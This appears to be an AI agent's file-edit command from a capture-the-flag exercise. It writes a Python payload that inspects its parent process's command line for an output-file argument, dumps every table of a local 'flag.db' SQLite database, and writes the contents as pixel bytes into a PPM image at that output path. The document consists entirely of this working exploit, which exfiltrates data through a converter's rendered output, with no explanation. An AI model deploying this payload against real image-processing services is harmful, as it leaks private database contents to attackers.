edit 1:1
import sqlite3, os

ppid = os.getppid()
outfile = None
try:
    cmdline = open("/proc/%d/cmdline" % ppid, "rb").read().split(b"\0")
    for a in cmdline:
        if a.startswith(b"-sOutputFile="):
            outfile = a[len(b"-sOutputFile="):].decode()
except Exception as e:
    pass

flag = ""
try:
    con = sqlite3.connect("/home/picgram/flag.db")
    cur = con.cursor()
    cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
    for t in cur.fetchall():
        cur.execute("SELECT * FROM " + t[0])
        flag += str(t) + str(cur.fetchall())
except Exception as e:
    flag = "ERR:" + str(e)

data = flag.encode()
w = max(len(data), 1)
ppm = b"P6\n%d 1\n255\n" % w
for b in data:
    ppm += bytes([b, b, b])
if outfile:
    open(outfile, "wb").write(ppm)
end_of_edit

